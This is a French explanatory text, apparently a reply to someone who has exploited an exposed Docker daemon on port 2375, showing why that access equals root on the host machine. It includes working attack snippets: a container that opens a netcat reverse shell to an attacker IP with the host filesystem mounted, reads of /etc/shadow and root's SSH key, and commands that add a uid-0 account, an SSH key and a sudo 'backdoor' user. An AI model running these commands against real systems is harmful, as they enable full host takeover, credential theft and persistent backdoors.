## Ce que permet réellement l'accès au port 2375

L'accès au port 2375 ne donne **pas** seulement accès au conteneur, mais au **Docker Daemon lui-même**, qui tourne sur la **machine hôte**.

### Hiérarchie d'accès

```basic
Machine hôte (192.168.y.x) - Utilisateur "usr"
    │
    ├── Docker Daemon (écoute sur port 2375)
    │   │
    │   ├── Conteneur 1
    │   ├── Conteneur 2
    │   └── Conteneur N (celui que vous créez)
    │
    └── Système de fichiers hôte (/etc, /home, /root, etc.)
```

### Pourquoi c'est équivalent à root sur l'hôte

Quand vous contrôlez le Docker Daemon via le port 2375, vous pouvez :

1. **Créer n'importe quel conteneur**

2. **Monter n'importe quel répertoire de l'hôte dans ce conteneur**

   ```python
   volumes={'/': {'bind': '/host', 'mode': 'rw'}}
   ```

   Cette ligne monte **tout le système de fichiers de la machine hôte** dans le conteneur

3. **Accéder à ces fichiers depuis le conteneur**

   ```bash
   # Dans le conteneur
   ls /host/home/usr/        # Fichiers de l'utilisateur usr
   cat /host/etc/shadow      # Mots de passe hachés de l'hôte
   cat /host/root/.ssh/id_rsa # Clés SSH de root
   ```

4. **Modifier ces fichiers**

   ```bash
   # Créer un nouvel utilisateur root sur l'hôte
   echo 'hacker:x:0:0::/root:/bin/bash' >> /host/etc/passwd
   
   # Ajouter votre clé SSH pour l'utilisateur usr
   echo 'VOTRE_CLE_SSH' >> /host/home/usr/.ssh/authorized_keys
   ```

### Démonstration concrète

**Ce que vous avez fait dans votre exploitation :**

```python
container = client.containers.run(
    'alpine:latest',
    f'nc {IP_ATTAQUANT} 4444 -e /bin/sh',
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},  # ← ICI
    privileged=True
)
```

Cette ligne a monté **tout le disque dur de la machine "usr"** dans votre conteneur sous `/host`.

**Résultat :**

- Vous êtes root **dans le conteneur**
- Le conteneur a accès **au système de fichiers complet de la machine hôte "usr"**
- Donc vous avez effectivement un accès root **à la machine hôte**

### Comparaison claire

| Accès                                  | Ce que vous contrôlez                                        |
| -------------------------------------- | ------------------------------------------------------------ |
| **Accès au conteneur uniquement**      | Uniquement les fichiers et processus dans ce conteneur isolé |
| **Accès au port 2375 (Docker Daemon)** | - Le daemon Docker<br>- Tous les conteneurs<br>- **Le système de fichiers de l'hôte** (via montages)<br>- Les processus de l'hôte (via pid_mode='host')<br>- Le réseau de l'hôte (via network_mode='host') |

### Pourquoi c'est équivalent à "root sur la machine"

En pratique, avec l'accès au Docker Daemon, vous pouvez :

```python
# Exécuter des commandes DIRECTEMENT sur l'hôte
container = client.containers.run(
    'alpine:latest',
    'chroot /host /bin/bash -c "useradd -m -G sudo backdoor"',
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    privileged=True
)
```

Cette commande crée un nouvel utilisateur **directement sur la machine hôte "usr"**, pas juste dans un conteneur.

### Conclusion

**Non, le port 2375 ne permet pas seulement de se connecter à un conteneur.**

Il donne accès au **Docker Daemon** qui, par conception, a des privilèges root sur la machine hôte. En exploitant cette API, vous pouvez :

- Lire tous les fichiers de l'hôte
- Modifier tous les fichiers de l'hôte
- Exécuter des commandes sur l'hôte
- Créer des backdoors permanentes
- Voler des données sensibles
- Compromettre complètement le système

**C'est pour ça qu'on dit : exposer le port 2375 = donner root à distance.**